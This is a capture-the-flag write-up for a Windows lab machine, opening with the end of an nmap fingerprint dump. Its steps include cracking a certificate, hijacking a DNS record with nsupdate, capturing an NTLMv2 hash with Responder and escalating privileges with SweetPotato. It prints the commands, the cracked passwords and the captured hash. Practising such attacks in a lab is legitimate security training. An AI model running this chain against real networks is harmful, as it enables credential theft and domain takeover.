SF:<pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(LDAPSearchRe
SF:q,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x84\r\nContent
SF:-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConn
SF:ection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20I
SF:llegal\x20character\x20OTEXT=0x84</pre>")%r(LDAPBindReq,C3,"HTTP/1\.1\x
SF:20400\x20Illegal\x20character\x20CNTL=0xc\r\nContent-Type:\x20text/html
SF:;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\
SF:n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character
SF:\x20CNTL=0xc</pre>")%r(SIPOptions,AD,"HTTP/1\.1\x20400\x20Unknown\x20Ve
SF:rsion\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Lengt
SF:h:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><
SF:pre>reason:\x20Unknown\x20Version</pre>")%r(LANDesk-RC,C3,"HTTP/1\.1\x2
SF:0400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;
SF:charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n
SF:\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\
SF:x20CNTL=0x4</pre>")%r(TerminalServer,C3,"HTTP/1\.1\x20400\x20Illegal\x2
SF:0character\x20CNTL=0x3\r\nContent-Type:\x20text/html;charset=iso-8859-1
SF:\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Mes
SF:sage\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x3</pre>"
SF:)%r(NCP,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nCon
SF:tent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\n
SF:Connection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\
SF:x20Illegal\x20character\x20CNTL=0x0</pre>")%r(NotesRPC,C3,"HTTP/1\.1\x2
SF:0400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;
SF:charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n
SF:\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\
SF:x20CNTL=0x0</pre>")%r(oracle-tns,C3,"HTTP/1\.1\x20400\x20Illegal\x20cha
SF:racter\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\n
SF:Content-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message
SF:\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(
SF:ms-sql-s,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x12\r\nC
SF:ontent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2070\r
SF:\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason
SF::\x20Illegal\x20character\x20CNTL=0x12</pre>")%r(afp,C3,"HTTP/1\.1\x204
SF:00\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;ch
SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
SF:0CNTL=0x0</pre>")%r(giop,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x
SF:20CNTL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-
SF:Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400<
SF:/h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.80%T=SSL%I=7%D=2/13%Time=63EA4635%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2013\x20Fe
SF:b\x202023\x2014:16:21\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x20
SF:2020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:
SF:\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title
SF:>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</
SF:head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x2020
SF:0\x20OK\r\nDate:\x20Mon,\x2013\x20Feb\x202023\x2014:16:22\x20GMT\r\nAll
SF:ow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x204
SF:00\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20M
SF:essage\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck
SF:,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-
SF:Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConne
SF:ction:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Il
SF:legal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTT
SF:P/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20t
SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20
SF:close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20c
SF:haracter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400
SF:\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;char
SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
SF:<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20C
SF:NTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x2
SF:0URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>")%r(Te
SF:rminalServerCookie,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL
SF:=0x3\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length
SF::\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><p
SF:re>reason:\x20Illegal\x20character\x20CNTL=0x3</pre>")%r(TLSSessionReq,
SF:C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x16\r\nContent-Ty
SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2070\r\nConnect
SF:ion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Ille
SF:gal\x20character\x20CNTL=0x16</pre>")%r(Kerberos,C3,"HTTP/1\.1\x20400\x
SF:20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charse
SF:t=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h
SF:1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNT
SF:L=0x0</pre>")%r(SMBProgNeg,C3,"HTTP/1\.1\x20400\x20Illegal\x20character
SF:\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConten
SF:t-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2040
SF:0</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(X11Pro
SF:be,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-
SF:Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConne
SF:ction:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Il
SF:legal\x20character\x20CNTL=0x0</pre>")%r(FourOhFourRequest,1BD,"HTTP/1\
SF:.1\x20404\x20Not\x20Found\r\nDate:\x20Mon,\x2013\x20Feb\x202023\x2014:1
SF:6:24\x20GMT\r\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nC
SF:ontent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20267\
SF:r\n\r\n<html>\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20content=
SF:\"text/html;charset=utf-8\"/>\n<title>Error\x20404\x20Not\x20Found</tit
SF:le>\n</head>\n<body><h2>HTTP\x20ERROR\x20404</h2>\n<p>Problem\x20access
SF:ing\x20/nice%20ports%2C/Tri%6Eity\.txt%2ebak\.\x20Reason:\n<pre>\x20\x2
SF:0\x20\x20Not\x20Found</pre></p>\n</body>\n</html>\n")%r(LPDString,C3,"H
SF:TTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x1\r\nContent-Type:\x2
SF:0text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x
SF:20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x2
SF:0character\x20CNTL=0x1</pre>")%r(LDAPSearchReq,C7,"HTTP/1\.1\x20400\x20
SF:Illegal\x20character\x20OTEXT=0x84\r\nContent-Type:\x20text/html;charse
SF:t=iso-8859-1\r\nContent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h
SF:1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20OTE
SF:XT=0x84</pre>")%r(LDAPBindReq,C3,"HTTP/1\.1\x20400\x20Illegal\x20charac
SF:ter\x20CNTL=0xc\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0xc</pre>")%r(SIP
SF:Options,AD,"HTTP/1\.1\x20400\x20Unknown\x20Version\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Unknown\x20
SF:Version</pre>")%r(LANDesk-RC,C3,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x4\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x4</pre>")%r(Term
SF:inalServer,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x3\r\n
SF:Content-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\
SF:r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reaso
SF:n:\x20Illegal\x20character\x20CNTL=0x3</pre>")%r(NCP,C3,"HTTP/1\.1\x204
SF:00\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;ch
SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
SF:0CNTL=0x0</pre>")%r(NotesRPC,C3,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(Java
SF:RMI,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent
SF:-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConn
SF:ection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20I
SF:llegal\x20character\x20CNTL=0x0</pre>")%r(WMSRequest,C3,"HTTP/1\.1\x204
SF:00\x20Illegal\x20character\x20CNTL=0x1\r\nContent-Type:\x20text/html;ch
SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
SF:0CNTL=0x1</pre>")%r(oracle-tns,C3,"HTTP/1\.1\x20400\x20Illegal\x20chara
SF:cter\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(ms
SF:-sql-s,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x12\r\nCon
SF:tent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2070\r\n
SF:Connection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\
SF:x20Illegal\x20character\x20CNTL=0x12</pre>")%r(afp,C3,"HTTP/1\.1\x20400
SF:\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;char
SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
SF:<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20C
SF:NTL=0x0</pre>")%r(giop,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20
SF:CNTL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Le
SF:ngth:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h
SF:1><pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: 
|_  ERROR: Name query failed: TIMEOUT
| smb-os-discovery: 
|_  ERROR: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb-security-mode: 
|_  ERROR: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-13T14:18:18
|_  start_date: N/A

Read from /usr/bin/../share/nmap: nmap-payloads nmap-service-probes nmap-services.
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 13 15:23:06 2023 -- 1 IP address (1 host up) scanned in 609.68 seconds
```

## Web enumeration

First, let's add the domain and subdomains we found earlier with [nmap](https://nmap.org/book/man.html) in our `/etc/hosts` file :  
```
attacker@AttackBox:~/Ra2$ sudo nano /etc/hosts
attacker@AttackBox:~/Ra2$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	AttackBox
10.10.133.87	windcorp.thm	selfservice.windcorp.thm	fire.windcorp.thm	selfservice.dev.windcorp.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, let's use [Gobuster](https://github.com/OJ/gobuster) to look for files and directories on `fire.windcorp.thm` :  
```
attacker@AttackBox:~/Ra2$ cat gobusterResults.txt 
/img                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/img/]
/css                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/css/]
/vendor               (Status: 301) [Size: 156] [--> https://fire.windcorp.thm/vendor/]
/IMG                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/IMG/]
/CSS                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/CSS/]
/Img                  (Status: 301) [Size: 153] [--> https://fire.windcorp.thm/Img/]
/powershell           (Status: 302) [Size: 165] [--> /powershell/default.aspx?ReturnUrl=%2fpowershell]
```

There is a directory named `powershell`. Let's take a look at it using a web browser :  
![](https://i.imgur.com/WfdNwlK.jpg)  

We need a set of credentials. But we found an interesting information for privilege escalation, we found the OS version `Windows Server 2016`.

Now, let's take a look at `selfservice.dev.windcorp.thm`using a web browser :  
![](https://i.imgur.com/hz7IY0Y.jpg)  

It is under construction... Maybe we can find some interesting files laying around using gobuster :  
```
attacker@AttackBox:~/Ra2$ cat gobusterResults_selfservice.dev.txt 
/backup               (Status: 301) [Size: 167] [--> https://selfservice.dev.windcorp.thm/backup/]
/Backup               (Status: 301) [Size: 167] [--> https://selfservice.dev.windcorp.thm/Backup/]
```

There is a `backup` directory. Let's take a look at it using a web browser :  
![](https://i.imgur.com/GI1KHlO.jpg)  

There is two files. But we only have access to `cert.pfx`, so let's download it.

## DNS Enumeration

We can use [dig](https://linux.die.net/man/1/dig) to enumerate the DNS service :  
```
attacker@AttackBox:~/Ra2$ dig @10.10.133.87 windcorp.thm any

; <<>> DiG 9.16.37-Debian <<>> @10.10.133.87 windcorp.thm any
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 65292
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.			IN	ANY

;; ANSWER SECTION:
windcorp.thm.		600	IN	A	10.10.133.87
windcorp.thm.		3600	IN	NS	fire.windcorp.thm.
windcorp.thm.		3600	IN	SOA	fire.windcorp.thm. hostmaster.windcorp.thm. 294 900 600 86400 3600
windcorp.thm.		86400	IN	TXT	"THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}"

;; ADDITIONAL SECTION:
fire.windcorp.thm.	3600	IN	A	10.10.133.87
fire.windcorp.thm.	3600	IN	A	192.168.112.1

;; Query time: 40 msec
;; SERVER: 10.10.133.87#53(10.10.133.87)
;; WHEN: Tue Mar 07 18:49:41 CET 2023
;; MSG SIZE  rcvd: 302
```

We have the first flag ! And it contains the hint to go further in the challenge. So we should be able to edit the DNS records.

## Certificate cracking

Now, let's crack the certificate we found using [john](https://www.openwall.com/john/doc/) :  
```
attacker@AttackBox:~/Ra2$ /opt/john/run/pfx2john.py cert.pfx > hash.txt
attacker@AttackBox:~/Ra2$ /opt/john/run/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 SSE4.1 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
ganteng          (cert.pfx)     
1g 0:00:00:00 DONE (2023-03-07 18:52) 2.127g/s 4357p/s 4357c/s 4357C/s clifford..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now we have the password for the certificate ! We may be able to use it to impersonate `selfservice.windcorp.thm` and capture some useful informations from the 
clients.

## DNS update

Let's update the DNS service to impersonate `selfservice.windcorp.thm` using [nsupdate](https://linux.die.net/man/8/nsupdate) :  
```
attacker@AttackBox:~/Ra2$ nsupdate
> server 10.10.133.87
> update delete selfservice.windcorp.thm ANY
> send
> update add selfservice.windcorp.thm 3600 A 10.14.32.60
> send
> quit
```

Now, when a client try to send a request to `selfservice.windcorp.thm`, it should be send to our attacking machine.

## NTLM hash capture

Now, we have to capture the traffic using [Responder](https://github.com/SpiderLabs/Responder). First, we need to extract the certificate and the key from the pfx file we cracked :  
```
attacker@AttackBox:~/Ra2$ openssl pkcs12 -in cert.pfx -nocerts -out responder.key
Enter Import Password: ganteng
Enter PEM pass phrase: ganteng
Verifying - Enter PEM pass phrase: ganteng
attacker@AttackBox:~/Ra2$ openssl pkcs12 -in cert.pfx -nokeys -out responder.crt
Enter Import Password: ganteng
```

Then, we have to move the two file we created (`responder.crt` and `responder.key`) to the `certs` directory of [Responder](https://github.com/SpiderLabs/Responder) :  
```
attacker@AttackBox:~/Ra2$ sudo mv responder.crt responder.key /opt/Responder/certs/
```

Finally, we can run [Responder](https://github.com/SpiderLabs/Responder) to capture requests :  
```
attacker@AttackBox:~/Ra2$ sudo responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C

/!\ Warning: files/AccessDenied.html: file not found
/!\ Warning: files/BindShell.exe: file not found

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.14.32.60]
    Challenge set              [1122334455667788]

Enter PEM pass phrase: ganteng

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.10.133.87
[HTTP] NTLMv2 Username : WINDCORP\edwardle
[HTTP] NTLMv2 Hash     : edwardle::WINDCORP:1122334455667788:F425E5D3F831B392551602820A7802BE:01010000000000000837A8791F51D9014879386878430BFB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000F1D72ED444594AD0F18547F99E9B8E7FC852BA2FD9F249020A8CC4A08B7449AC0A00100012C690EF73A24A276DC3EDC54B8CC48409003A0048005400540050002F00730065006C00660073006500720076006900630065002E00770069006E00640063006F00720070002E00740068006D000000000000000000
```

We have captured the NTLM hash of user `edwardle` !

## NTLM hash cracking

Now, let's try to crack the hash we found earlier using [john](https://www.openwall.com/john/doc/) :  
```
attacker@AttackBox:~/Ra2$ nano ntlm.txt
attacker@AttackBox:~/Ra2$ /opt/john/run/john ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
!Angelus25!      (edwardle)     
1g 0:00:00:14 DONE (2023-03-07 19:08) 0.07062g/s 1012Kp/s 1012Kc/s 1012KC/s !Sketchy!..!@#fire123
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

And now we have the password for user `edwardle` ! We can try to use those credentials on the `/powershell` directory we found during the web enumeration :  
![](https://i.imgur.com/IGLdqDZ.jpg)  

![](https://i.imgur.com/IGSk2O3.jpg)  

We have access to a powershell web shell !

## Windows enumeration

First, we can get the second flag in `C:\Users\edwardle.WINDCORP\Desktop\Flag 2.txt`.  

It's time to do some windows enumeration :  
![](https://i.imgur.com/ppHHNjr.jpg)  
We are member of `Account Operators` group. We may have the right to create a new user.  

![](https://i.imgur.com/bPlQNaf.jpg)  

## Privilege escalation

We have the SeImpersonatePrivilege, and the machine is running an older version of Windows Server (Windows Server 2016). The target seems 
to be vulnerable to [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). We can try to use this expoit to run arbitrary commands. First, let's crate a new user :  
![](https://i.imgur.com/e2IxtYI.jpg)  

Now, let's download SweetPotato from [here](https://github.com/uknowsec/SweetPotato) and then send it to the target 
(This exploits is based on [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and can run abritrary commands with full privileges) :  
![](https://i.imgur.com/KdOCOx8.jpg)  

Now, we can run this exploit to add the user we created to the `Administrators` group :  
![](https://i.imgur.com/Jdsw18D.jpg)  

Now, we should be able to connect to the target via RDP using the credentials of the user we created earlier :  
![](https://i.imgur.com/r5ubU4q.jpg)  
![](https://i.imgur.com/JuP6F1o.jpg)  

Now, we just have to get the final flag in `C:\Users\Administrator\Desktop\Flag 3.txt` !

## Conclusion

In this room, we practiced :  
- Services and open ports enumeration using [nmap](https://nmap.org/book/man.html)
- Web enumeration using [Gobuster](https://github.com/OJ/gobuster) and manually
- Hash cracking using [john](https://www.openwall.com/john/doc/)
- DNS record injection using [nsupdate](https://linux.die.net/man/8/nsupdate)
- Windows enumeration
- Windows privileges escalation using [SweetPotato](https://github.com/uknowsec/SweetPotato)

Thanks for this room and thanks for reading my write ups !
